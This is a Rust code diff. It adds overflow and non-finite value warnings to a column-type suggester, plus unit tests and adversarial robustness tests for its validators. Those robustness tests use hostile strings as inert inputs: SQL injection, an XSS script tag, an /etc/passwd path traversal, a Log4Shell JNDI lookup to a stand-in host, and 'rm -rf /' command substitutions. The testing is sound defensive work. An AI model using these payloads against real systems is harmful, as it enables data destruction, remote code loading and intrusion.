@@ -245,6 +245,18 @@ fn normalize_numeric_str(s: &str) -> (String, bool) {
     (cleaned, is_percent)
 }
 
+/// A bare integer literal (optional single leading '-', otherwise all ASCII
+/// digits) - as opposed to a decimal or exponential form. Used to detect
+/// values that reach the f64 branch specifically because they overflowed
+/// i64: such a value is, by construction, already too large for i64's
+/// range (~9.2e18), which is itself well past f64's exact-integer range
+/// (2^53, ~9e15) - so representing it as a float is guaranteed to lose
+/// precision, not just risk it.
+fn is_plain_integer_literal(s: &str) -> bool {
+    let body = s.strip_prefix('-').unwrap_or(s);
+    !body.is_empty() && body.chars().all(|c| c.is_ascii_digit())
+}
+
 fn numeric_note(current: &str, target: &str, any_percent: bool) -> String {
     let mut parts = Vec::new();
     if current != target {
@@ -627,7 +639,40 @@ fn suggest_ideal_type(values: &[&str], current: &str) -> (String, String) {
         return ("i64".to_string(), numeric_note(current, "i64", any_percent));
     }
     if cleaned_refs.iter().all(|v| v.parse::<f64>().is_ok()) {
-        return ("f64".to_string(), numeric_note(current, "f64", any_percent));
+        let mut note = numeric_note(current, "f64", any_percent);
+        // Rust's f64 parser accepts "inf"/"infinity"/"nan" (any case, signed)
+        // as legitimate values - real IEEE-754 special values, not a parse
+        // error - so a stray "Infinity" typed into an otherwise-clean numeric
+        // column sails through silently unless flagged explicitly here.
+        if cleaned_refs
+            .iter()
+            .any(|v| v.parse::<f64>().is_ok_and(|f| !f.is_finite()))
+        {
+            let extra = "contains a non-finite value (Infinity/NaN) - verify this isn't a data-quality sentinel before trusting downstream arithmetic";
+            note = if note.is_empty() {
+                extra.to_string()
+            } else {
+                format!("{note}; {extra}")
+            };
+        }
+        // A value that's itself a plain integer literal but individually
+        // failed i64 parsing (as opposed to merely being outvoted by some
+        // other, differently-shaped value in the same column, like the
+        // "infinity" case just above) is, by construction, already too
+        // large to represent exactly as f64 either - see
+        // is_plain_integer_literal's doc comment.
+        if cleaned_refs
+            .iter()
+            .any(|v| is_plain_integer_literal(v) && v.parse::<i64>().is_err())
+        {
+            let extra = "value(s) exceed i64's range and f64's exact-integer range (~2^53) - representing as float silently loses precision";
+            note = if note.is_empty() {
+                extra.to_string()
+            } else {
+                format!("{note}; {extra}")
+            };
+        }
+        return ("f64".to_string(), note);
     }
 
     let unique: HashSet<&str> = values.iter().copied().collect();
@@ -3965,6 +4010,58 @@ mod tests {
     }
 
     #[test]
+    fn suggest_ideal_type_flags_a_literal_infinity_or_nan_value_as_non_finite() {
+        // Rust's f64 parser accepts "infinity"/"nan" (any case, signed) as
+        // real IEEE-754 values, not a parse error - a stray one in an
+        // otherwise-clean numeric column must not sail through silently.
+        for word in ["infinity", "Infinity", "-infinity", "inf", "NaN", "+inf"] {
+            let (ideal, note) = suggest_ideal_type(&["42.5", word, "100"], "String");
+            assert_eq!(ideal, "f64", "word={word}");
+            assert!(note.contains("non-finite"), "word={word} note={note}");
+        }
+    }
+
+    #[test]
+    fn suggest_ideal_type_does_not_flag_precision_loss_for_ordinary_i64_sized_values() {
+        // A stray non-numeric-shaped value (here, "infinity") blocking the
+        // i64 gate must not cause perfectly ordinary small integers in the
+        // same column to be wrongly flagged as "overflowed i64" once the
+        // whole column falls through to the f64 branch.
+        let (ideal, note) = suggest_ideal_type(&["100", "200", "infinity"], "String");
+        assert_eq!(ideal, "f64");
+        assert!(note.contains("non-finite"));
+        assert!(!note.contains("exceed i64"), "note={note}");
+    }
+
+    #[test]
+    fn suggest_ideal_type_flags_precision_loss_for_values_beyond_i64_range() {
+        // These all overflow i64 (max ~9.2e18) and are therefore already
+        // past f64's exact-integer range (2^53, ~9e15) too - representing
+        // them as float is guaranteed to lose real digits.
+        let (ideal, note) = suggest_ideal_type(
+            &[
+                "123456789012345678901",
+                "999999999999999999999",
+                "555555555555555555555",
+            ],
+            "String",
+        );
+        assert_eq!(ideal, "f64");
+        assert!(note.contains("exceed i64"), "note={note}");
+        assert!(!note.contains("non-finite"), "note={note}");
+    }
+
+    #[test]
+    fn is_plain_integer_literal_rejects_decimals_signs_and_empty_strings() {
+        assert!(is_plain_integer_literal("123"));
+        assert!(is_plain_integer_literal("-123"));
+        assert!(!is_plain_integer_literal("12.3"));
+        assert!(!is_plain_integer_literal("1e10"));
+        assert!(!is_plain_integer_literal(""));
+        assert!(!is_plain_integer_literal("-"));
+    }
+
+    #[test]
     fn parse_prefixed_int_decodes_hex_binary_and_octal_but_not_bare_hex() {
         assert_eq!(parse_prefixed_int("0x1A"), Some(26));
         assert_eq!(parse_prefixed_int("0b1010"), Some(10));
@@ -4150,5 +4247,208 @@ mod tests {
         assert!(is_missing_sentinel("-"));
         assert!(!is_missing_sentinel("Namibia")); // must not substring-match "NA"
         assert!(!is_missing_sentinel("42"));
+    }
+
+    // --- Adversarial / robustness tests -----------------------------------
+    // These exist to prove reliability under hostile input, not just typical
+    // input: every validator below does byte-level or string-slicing work of
+    // some kind, and a str-slice at a byte offset that isn't a UTF-8 char
+    // boundary panics in Rust - a real risk for any function fed arbitrary
+    // file content. Each case here either (a) proves a specific slicing
+    // operation is safe by construction, not just by inspection, or (b)
+    // proves a checksum/grammar check can't be fooled by an off-by-one
+    // near-miss.
+
+    /// A grab-bag of hostile strings: empty, control characters, multi-byte
+    /// unicode (including 4-byte emoji, to stress anything doing byte
+    /// arithmetic), injection-style payloads (SQL/shell/template/path), and
+    /// degenerate near-numeric strings. None of these should make any
+    /// validator panic, regardless of what they return.
+    const ADVERSARIAL_STRINGS: &[&str] = &[
+        "",
+        " ",
+        "\0",
+        "\0\0\0",
+        "\n\t\r",
+        "💥",
+        "🔥🔥🔥🔥🔥🔥🔥🔥",
+        "é",
+        "café",
+        "café💰100",
+        "(café)",
+        "(💰100€)",
+        "'; DROP TABLE users; --",
+        "<script>alert(1)</script>",
+        "../../../../etc/passwd",
+        "%s%s%s%s%s%n",
+        "{}{}{}{}",
+        "${jndi:ldap://evil.example/a}",
+        "\u{200B}\u{200B}\u{200B}", // zero-width spaces
+        "\u{FEFF}",                 // BOM
+        "-----------------------------",
+        "0000000000000000000000000000",
+        "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
+        "-",
+        "--",
+        "+",
+        "++",
+        "0x",
+        "0b",
+        "0o",
+        "0xZZZZ",
+        ".",
+        "..",
+        "...",
+        "@",
+        "@@@@",
+        ":::::::::",
+        "-.-.-.-.-.-",
+        "GB29café1234567890", // IBAN-shaped prefix, multi-byte payload
+    ];
+
+    #[test]
+    fn every_validator_survives_adversarial_input_without_panicking() {
+        for s in ADVERSARIAL_STRINGS {
+            let _ = is_uuid(s);
+            let _ = is_email(s);
+            let _ = is_url(s);
+            let _ = is_ipv4(s);
+            let _ = is_ipv6(s);
+            let _ = is_mac_address(s);
+            let _ = is_iban(s);
+            let _ = is_credit_card_number(s);
+            let _ = is_isbn10(s);
+            let _ = is_isbn13(s);
+            let _ = is_ean_or_upc(s);
+            let _ = is_semver(s);
+            let _ = is_embedded_json(s);
+            let _ = parse_prefixed_int(s);
+            let _ = is_missing_sentinel(s);
+            let _ = has_leading_zero(s);
+            let _ = is_bool_word(s);
+            let _ = normalize_numeric_str(s);
+            let _ = is_plain_integer_literal(s);
+            let _ = matching_date_format(&[s]);
+            let _ = matching_time_format(&[s]);
+            let _ = suggest_ideal_type(&[s], "String");
+        }
+    }
+
+    #[test]
+    fn every_validator_survives_a_single_extremely_long_value_without_panicking() {
+        let long_ascii = "9".repeat(100_000);
+        let long_unicode = "é".repeat(50_000);
+        for s in [long_ascii.as_str(), long_unicode.as_str()] {
+            let _ = is_uuid(s);
+            let _ = is_email(s);
+            let _ = is_iban(s);
+            let _ = is_credit_card_number(s);
+            let _ = is_isbn10(s);
+            let _ = is_isbn13(s);
+            let _ = is_ean_or_upc(s);
+            let _ = is_semver(s);
+            let _ = is_embedded_json(s);
+            let _ = normalize_numeric_str(s);
+            let _ = suggest_ideal_type(&[s], "String");
+        }
+    }
+
+    #[test]
+    fn is_iban_never_panics_on_a_multibyte_payload_past_the_ascii_prefix() {
+        // "GB29" passes the initial byte-level alphabetic/digit gate, so
+        // execution reaches the str-slice at byte offset 4 - this is only
+        // safe because that gate guarantees the first 4 bytes are all
+        // single-byte ASCII, making offset 4 a real char boundary no matter
+        // what multi-byte content follows. Proven here, not just reasoned
+        // about: this must return false, not panic.
+        assert!(!is_iban("GB29café1234567890"));
+        assert!(!is_iban("GB29💰💰💰💰💰💰💰💰"));
+        assert!(!is_iban("XX99日本語日本語日本語"));
+    }
+
+    #[test]
+    fn normalize_numeric_str_never_panics_on_multibyte_content_inside_parens() {
+        // The parenthesized-negative path slices at [1..len-1], safe only
+        // because starts_with('(')/ends_with(')') guarantee those are
+        // single-byte ASCII characters at both ends. The function doesn't
+        // judge whether the content is actually numeric - it unconditionally
+        // treats "(...)" as a negation and prepends '-' - so "café" comes
+        // back as "-café" (which the later i64/f64 parse will correctly
+        // reject; that's suggest_ideal_type's job, not this function's).
+        let (cleaned, _) = normalize_numeric_str("(café)");
+        assert_eq!(cleaned, "-café");
+        let (cleaned, is_pct) = normalize_numeric_str("(💰100€)");
+        assert_eq!(cleaned, "-💰100");
+        assert!(!is_pct);
+    }
+
+    #[test]
+    fn near_miss_checksums_are_rejected_not_rounded_up() {
+        // Every one of these is a real, valid identifier with exactly one
+        // character tampered - proving the checksum genuinely discriminates
+        // rather than just checking shape/length.
+        assert!(!is_iban("GB29NWBK60161331926818")); // last digit off by one
+        assert!(!is_credit_card_number("4111111111111110")); // last digit off by one
+        assert!(!is_isbn10("0306406151")); // last digit off by one
+        assert!(!is_isbn13("9780306406156")); // last digit off by one
+        assert!(!is_ean_or_upc("4006381333930")); // last digit off by one
+    }
+
+    #[test]
+    fn near_miss_shapes_are_rejected_for_uuid_email_ipv4_ipv6_mac() {
+        assert!(!is_uuid("550e8400-e29b-41d4-a716-44665544000")); // 35 chars, one short
+        assert!(!is_uuid("550e8400e29b41d4a716446655440000")); // no dashes at all
+        assert!(!is_uuid("gggggggg-e29b-41d4-a716-446655440000")); // non-hex group
+        assert!(!is_email("user@@example.com")); // doubled '@'
+        assert!(!is_email("user@example.")); // domain ends in a dot
+        assert!(!is_email("user@.com")); // domain starts with a dot
+        assert!(!is_ipv4("256.1.1.1")); // octet out of range
+        assert!(!is_ipv4("1.2.3")); // only 3 octets
+        assert!(!is_ipv4("1.2.3.4.5")); // 5 octets
+        assert!(!is_ipv6("2001:db8:1")); // too few groups, no "::"
+        assert!(!is_mac_address("00:1A:2B:3C:4D")); // only 5 groups
+        assert!(!is_mac_address("00:1A:2B:3C:4D:5E:6F")); // 7 groups
+        assert!(!is_mac_address("GG:1A:2B:3C:4D:5E")); // non-hex group
+    }
+
+    #[test]
+    fn suggest_ideal_type_falls_back_when_a_single_value_breaks_an_otherwise_uniform_column() {
+        // suggest_ideal_type requires every value in a column to match a
+        // given check (.all(...)) - one broken value must veto the whole
+        // column's classification rather than a majority vote deciding it,
+        // since a "mostly UUIDs" column is not a trustworthy UUID column.
+        let mostly_uuid = [
+            "550e8400-e29b-41d4-a716-446655440000",
+            "16fd2706-8baf-433b-82eb-8c7fada847da",
+            "c56a4180-65aa-42ec-a945-5fd21dec0538",
+            "not-a-uuid-at-all",
+        ];
+        let (ideal, _) = suggest_ideal_type(&mostly_uuid, "String");
+        assert_ne!(ideal, "UUID");
+
+        let mostly_ipv4 = ["192.168.1.1", "10.0.0.5", "8.8.8.8", "not-an-ip"];
+        let (ideal, _) = suggest_ideal_type(&mostly_ipv4, "String");
+        assert_ne!(ideal, "IPv4");
+    }
+
+    #[test]
+    fn injection_style_payloads_resolve_to_a_safe_fallback_type() {
+        // The tool never executes, interprets, or templates these values -
+        // they're just opaque bytes to type. Confirms they resolve to a
+        // plain, unremarkable type rather than tripping any heuristic into
+        // a false positive (or a panic, covered separately above).
+        let payloads = [
+            "'; DROP TABLE users; --",
+            "<script>alert(1)</script>",
+            "../../../../etc/passwd",
+            "${jndi:ldap://evil.example/a}",
+            "$(rm -rf /)",
+            "`rm -rf /`",
+        ];
+        let (ideal, _) = suggest_ideal_type(&payloads, "String");
+        assert!(
+            matches!(ideal.as_str(), "String" | "enum / category"),
+            "expected a safe fallback type, got {ideal}"
+        );
     }
 }
